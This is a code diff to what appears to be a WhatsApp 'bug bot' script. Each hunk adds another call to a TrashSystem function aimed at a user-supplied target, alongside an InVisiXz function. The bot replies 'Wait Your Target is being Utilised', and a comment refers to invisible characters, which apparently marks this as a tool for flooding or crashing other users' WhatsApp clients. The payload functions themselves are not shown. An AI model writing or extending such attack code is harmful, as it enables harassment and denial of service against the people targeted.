@@ -1085,6 +1085,7 @@ var contactInfo = await sam.onWhatsApp(target);
 reply(`Wait Your Target is being Utilised`)
 for (let i = 0; i < 2; i++) {
 await InVisiXz(target, sam, cct = true, ptcp = true)
+await TrashSystem(target, sam, cct = true, ptcp = true)
 }
 reply(`
 ┏━━━━━━━━━━━━━━━━━━━━━
@@ -1127,6 +1128,7 @@ var contactInfo = await sam.onWhatsApp(target);
 reply(`Wait Your Target is being Utilised`)
 // Function to convert text to invisible characters
    await TrashSystem(target, sam, cct = true, ptcp = true)
+await TrashSystem(target, sam, cct = true, ptcp = true)
   await TrashSystem(target, sam, cct = true, ptcp = true)
 reply(`
 ┏━━━━━━━━━━━━━━━━━━━━━
@@ -1215,6 +1217,7 @@ var contactInfo = await sam.onWhatsApp(target);
 reply(`Wait Your Target is being Utilised`)
 // Function to convert text to invisible characters
  await TrashSystem(target, sam, ptcp = true)
+await TrashSystem(target, sam, cct = true, ptcp = true)
  await TrashSystem(target, sam, ptcp = true)
   
  
